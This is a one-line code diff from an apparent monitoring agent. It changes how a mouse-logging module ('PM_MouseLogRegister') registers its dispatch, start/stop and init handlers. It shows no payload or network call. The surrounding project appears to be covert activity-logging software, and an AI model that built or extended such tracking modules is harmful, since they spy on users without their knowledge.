@@ -44,5 +44,5 @@ DWORD __stdcall PM_MouseLogInit(JSONObject elem)
 
 void PM_MouseLogRegister()
 {
-	AM_MonitorRegisterBSON(L"mouse", PM_MOUSEAGENT, (BYTE *)PM_MouseLogDispatch, (BYTE *)PM_MouseLogStartStop, (BYTE *)PM_MouseLogInit, NULL);
+	AM_MonitorRegister(L"mouse", PM_MOUSEAGENT, (BYTE *)PM_MouseLogDispatch, (BYTE *)PM_MouseLogStartStop, (BYTE *)PM_MouseLogInit, NULL);
 }
